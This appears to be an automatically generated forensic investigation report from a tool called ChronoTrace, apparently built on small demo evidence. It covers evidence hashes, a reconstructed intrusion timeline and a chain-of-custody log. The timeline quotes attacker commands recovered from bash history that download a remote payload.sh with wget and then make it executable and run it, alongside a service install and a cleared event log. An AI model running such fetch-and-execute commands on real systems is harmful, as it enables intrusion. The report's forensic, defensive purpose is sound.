# ChronoTrace Investigation Report — CASE-2026-LIVE

**Lead Examiner:** Alex Mercer (Senior Forensics Examiner)  
**Organization:** Cyber Incident Response Unit  
**Authorization Reference:** WARRANT-2026-0881  
**Schema Version:** 2.0.0 | **Tool Version:** 1.3.0  

---

## 1. Executive Summary & PS Objectives Matrix

| # | Objective | Status | Findings |
|---|---|---|---|
| 1 | **File metadata extraction** | COMPLETED | Extracted filesystem stats, OOXML properties, PDF metadata, ZIP entries. |
| 2 | **System artefact extraction** | COMPLETED | Extracted MFT, registry hives, EVTX event logs, Prefetch, LNK shortcuts, browser history. |
| 3 | **Timestamp extraction** | COMPLETED | Decoded multi-epoch timestamps normalized to UTC with explainable confidence. |
| 4 | **Chronological timeline reconstruction** | COMPLETED | Generated single normalized super-timeline with 28 records. |
| 5 | **SHA-256 evidence integrity** | VERIFIED | Mandatory SHA-256 computed; custody ledger replayed; Merkle root: `defe3975c8c2f439e8c251d4860a75cb3668c33623e2c79c0638852faf9d5542`. |
| 6 | **Structured investigation reports** | COMPLETED | Compiled multi-format reports with provenance, integrity block, and privacy redaction. |

---

## 2. Digital Evidence Inventory (SHA-256 Hashes)

| Evidence ID | Path | Container | Size (Bytes) | SHA-256 Hash | Status |
|---|---|---|---|---|---|

| `EV-AUTH.L` | `evidence/auth.log` | raw | 283 | `b544dfd8cc0d4521f4ba801cd4b9215ef76b6a5f76149038b6171cd664e095e4` | MATCH |

| `EV-BASH_H` | `evidence/bash_history` | raw | 112 | `a45c0410ad9fea5a6fec7056a904d518673c2e1950f124d9383dbdcfbfbdf554` | MATCH |

| `EV-EXFILT` | `evidence/exfiltrated_files.zip` | raw | 317 | `c720fbe8ec5b780648029576c2bb63d607ca03278deb6c72356ed84e7e4347d3` | MATCH |

| `EV-HISTOR` | `evidence/History` | raw | 8192 | `ddeee48ddcd3e8fd4b88dbe62d5624d7e71983919f0a12ceb3f79844e2322b95` | MATCH |

| `EV-INVEST` | `evidence/investigation_memo.docx` | raw | 813 | `47119c738b966e434a61c921bf638988ad8fa63d3ed6b772e181dd2ba14862ab` | MATCH |

| `EV-SECURI` | `evidence/Security_Events.jsonl` | raw | 503 | `15957efb2f1573f54296ac349387196a60825acb65518ab856a5179afe1e8ad0` | MATCH |


---

## 3. Reconstructed Chronological Activity Timeline (Excerpt)

| UTC Timestamp | Action | User | Object / Target | Source Artefact | Confidence | Rationale |
|---|---|---|---|---|---|---|

| `2024-03-10T14:30:00+00:00` | `FILE_CREATE` | [USER_001] | `evidence/investigation_memo.docx` | ooxml:core_properties | 0.98 | OOXML dcterms:created metadata |

| `2024-03-10T20:50:00+00:00` | `WEB_VISIT` | UNKNOWN | `https://github.com/malicious/repo` | Browser:Chromium:evidence/History | 0.97 | Chromium last_visit_time WebKit timestamp |

| `2024-03-10T21:00:00+00:00` | `WEB_VISIT` | UNKNOWN | `https://pastebin.com/raw/d849fa` | Browser:Chromium:evidence/History | 0.97 | Chromium last_visit_time WebKit timestamp |

| `2024-03-11T01:50:00+00:00` | `FILE_WRITE` | [USER_002] | `evidence/investigation_memo.docx` | ooxml:core_properties | 0.98 | OOXML dcterms:modified metadata |

| `2024-03-11T02:14:07+00:00` | `AUTH_LOGIN` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | 0.99 | Windows Event Log JSON entry for Event ID 4624 |

| `2024-03-11T02:14:07+00:00` | `AUTH_LOGIN` | UNKNOWN | `sshd[4401]` | Linux:sshd[4401]:evidence/auth.log | 0.85 | Syslog entry for sshd[4401] (assumed year 2024) |

| `2024-03-11T02:15:00+00:00` | `PROCESS_START` | UNKNOWN | `wget http://[IP_004]/payload.sh` | Linux:bash_history:evidence/bash_history | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:15:30+00:00` | `FILE_ACCESS` | UNKNOWN | `sudo` | Linux:sudo:evidence/auth.log | 0.85 | Syslog entry for sudo (assumed year 2024) |

| `2024-03-11T02:16:00+00:00` | `PROCESS_START` | UNKNOWN | `chmod +x payload.sh` | Linux:bash_history:evidence/bash_history | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:16:15+00:00` | `PROCESS_START` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | 0.99 | Windows Event Log JSON entry for Event ID 4688 |

| `2024-03-11T02:17:00+00:00` | `PROCESS_START` | UNKNOWN | `./payload.sh` | Linux:bash_history:evidence/bash_history | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:17:30+00:00` | `SERVICE_INSTALL` | UNKNOWN | `N/A` | EVTX:evidence/Security_Events.jsonl | 0.99 | Windows Event Log JSON entry for Event ID 7045 |

| `2024-03-11T02:18:45+00:00` | `FILE_ACCESS` | UNKNOWN | `sshd[4401]` | Linux:sshd[4401]:evidence/auth.log | 0.85 | Syslog entry for sshd[4401] (assumed year 2024) |

| `2024-03-11T02:20:00+00:00` | `LOG_CLEARED` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | 0.99 | Windows Event Log JSON entry for Event ID 1102 |

| `2026-10-05T17:33:32.171533+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/auth.log` | filesystem:stat | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T17:33:32.178088+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/bash_history` | filesystem:stat | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T17:33:32.185614+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/Security_Events.jsonl` | filesystem:stat | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T17:33:32.222163+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/History` | filesystem:stat | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T17:33:32.240614+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/investigation_memo.docx` | filesystem:stat | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T17:33:32.258687+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip` | filesystem:stat | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T17:33:32.336285+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/auth.log` | filesystem:stat | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T17:33:32.376938+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/bash_history` | filesystem:stat | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T17:33:32.410493+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/exfiltrated_files.zip` | filesystem:stat | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T17:33:32.440025+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/History` | filesystem:stat | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T17:33:32.470086+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/investigation_memo.docx` | filesystem:stat | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T17:33:32.500444+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/Security_Events.jsonl` | filesystem:stat | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T23:03:32+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip::passwords.txt` | zip:entry_central_dir | 0.85 | ZIP entry central directory DOS timestamp |

| `2026-10-05T23:03:32+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip::financial_report.pdf` | zip:entry_central_dir | 0.85 | ZIP entry central directory DOS timestamp |


*(Total reconstructed timeline events: 28)*

---

## 4. Cryptographic Integrity & Attestation

- **Overall Integrity Check:** `PASS`
- **Custody Ledger Replay:** `PASS` (10 entries verified)
- **Derived Files Status:** `PASS`
- **Merkle Root Digest:** `defe3975c8c2f439e8c251d4860a75cb3668c33623e2c79c0638852faf9d5542`

---

## 5. Chain of Custody Audit Log

| Seq | Timestamp (UTC) | Actor | Event Type | Prev Hash | Entry Hash |
|---|---|---|---|---|---|

| 1 | `2026-10-05T17:33:32.273671+00:00` | Alex Mercer (Senior Forensics Examiner) | `case_created` | `000000000000...` | `6ca2bccd4edc...` |

| 2 | `2026-10-05T17:33:32.362423+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `6ca2bccd4edc...` | `85301ab762a8...` |

| 3 | `2026-10-05T17:33:32.398653+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `85301ab762a8...` | `3cb2e3553415...` |

| 4 | `2026-10-05T17:33:32.427745+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `3cb2e3553415...` | `adf8d5fb72f6...` |

| 5 | `2026-10-05T17:33:32.458409+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `adf8d5fb72f6...` | `7fdf9d2b9028...` |

| 6 | `2026-10-05T17:33:32.489107+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `7fdf9d2b9028...` | `046c50ef601b...` |

| 7 | `2026-10-05T17:33:32.518768+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `046c50ef601b...` | `7f482c709352...` |

| 8 | `2026-10-05T17:33:32.628273+00:00` | Alex Mercer (Senior Forensics Examiner) | `artefacts_extracted` | `7f482c709352...` | `8f89eb999af6...` |

| 9 | `2026-10-05T17:33:33.523612+00:00` | Alex Mercer (Senior Forensics Examiner) | `timeline_built` | `8f89eb999af6...` | `943930e1fe1f...` |

| 10 | `2026-10-05T17:33:33.656127+00:00` | Alex Mercer (Senior Forensics Examiner) | `integrity_verified` | `943930e1fe1f...` | `339fa87f93d3...` |


---
*Generated automatically by ChronoTrace v1.3.0.*